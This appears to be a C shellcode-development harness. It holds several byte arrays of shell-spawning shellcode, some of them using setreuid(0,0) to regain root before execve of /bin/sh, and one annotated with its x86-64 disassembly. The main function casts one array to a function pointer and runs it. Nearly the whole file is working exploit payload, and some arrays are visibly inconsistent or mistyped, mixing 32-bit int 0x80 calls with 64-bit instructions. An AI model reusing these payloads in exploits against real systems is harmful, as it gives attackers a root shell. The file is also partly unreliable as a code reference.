#include <stdio.h>
#include <unistd.h>

char code[] = "\x55"
	"\x48\x89\xe5"
	"\xba\x00\x00\x00\x00"
	"\xba\x00\x00\x00\x00"
	"\xbf\xf4\x05\x40\x00"
	"\xe8\xd2\xfe\xff\xff"
	"\x90\x5d\xc3";

char shell[] =
	// _start
	"\x48\x31\xc0"
	"\xb0\x46"
	"\x48\x31\xdb"
	"\x48\x31\xc9"
	"\xcd\x80"
	"\xeb\x1b"
	// prep_string
	"\x5b"
	"\x48\31\xc0"
	"\x88\x43\x07"
	"\x48\x89\x5b\x08"
	"\x48\x89\x43\x10"
	// call_execve
	"\xb0\x0b"
	"\x48\x8d\x4b\x08"
	"\x48\x8d\x53\x10"
	"\xcd\x80"
	// put_addr_on_stack
	"\xe8\xe0\xff\xff\xff"
	// string
	"/bin/shN"
	"AAAAAAAA"
	"BBBBBBBB";

char ourcode[] = {
/*0000000000400078 <_start>:
  400078:	eb 1f                	jmp    40009e <put_addr_on_stack> */
	"\xeb\x1f"

/*000000000040007a <prep_string>:
  40007a:	5b                   	pop    %rbx
  40007b:	48 31 c0             	xor    %rax,%rax
  40007e:	88 43 07             	mov    %al,0x7(%rbx)
  400081:	48 89 5b 08          	mov    %rbx,0x8(%rbx)
  400085:	48 89 43 10          	mov    %rax,0x10(%rbx) */
	"\x5b"
	"\x48\x31\xc0"
	"\x88\x43\x07"
	"\x48\x89\x5b\x08"
	"\x48\x89\x43\x10"

/*0000000000400089 <call_execve>:
  400089:	48 31 c0             	xor    %rax,%rax
  40008c:	b0 3b                	mov    $0x3b,%al
  40008e:	48 31 d2             	xor    %rdx,%rdx
  400091:	48 31 f6             	xor    %rsi,%rsi
  400094:   48 89 df                mov    %rbx,%rdi
  40009c:	0f 05                	syscall */
	"\x48\x31\xc0"
	"\xb0\x3b"
	"\x48\x31\xd2"
	"\x48\x31\xf6"
	"\x48\x89\xdf"
	"\x0f\x05"

/*000000000040009e <put_addr_on_stack>:
  40009e:	e8 dc ff ff ff       	callq  40007a <prep_string> */
	"\xe8\xdc\xff\xff\xff"
	// string
	"/bin/shN"
	"AAAAAAAA"
	"BBBBBBBB"
	"\x0"
};

char testshell[] =
	"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"
	"\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
	"\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"
	"\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"
	"\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42";

void
test( void ) {
	const char prog[] = { "/bin/sh\0" };

	setreuid( 0, 0 );
	execve( prog, NULL, NULL );
}

int
main( void )
{
	void (*func)();
	func = (void (*)()) ourcode;
	(void)(*func)();
	return 0;
}
